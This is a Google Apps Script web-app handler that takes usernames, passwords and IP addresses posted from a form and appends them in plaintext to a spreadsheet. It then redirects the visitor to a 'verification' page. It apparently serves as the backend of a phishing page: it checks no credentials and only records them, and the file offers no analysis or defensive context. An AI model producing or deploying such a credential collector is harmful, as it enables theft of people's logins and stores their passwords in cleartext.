// Google Apps Script to handle form submissions
function doGet(e) {
  return ContentService.createTextOutput("Service is running");
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Get form data from e.parameter
    const data = {
      username: e.parameter.username,
      password: e.parameter.password,
      ipAddress: e.parameter.ipAddress
    };
    
    // Get current timestamp
    const timestamp = new Date();
    
    // Add data to sheet
    sheet.appendRow([
      timestamp,
      data.username,
      data.password,
      data.ipAddress || 'N/A'
    ]);
    
    // Redirect to verification page
    return HtmlService.createHtmlOutput(
      '<script>window.top.location.href = "verification.html";</script>'
    );
    
  } catch (error) {
    // Log error
    console.error(error);
    
    // Return error page
    return HtmlService.createHtmlOutput(
      '<script>alert("An error occurred. Please try again."); window.top.location.href = "index.html";</script>'
    );
  }
} 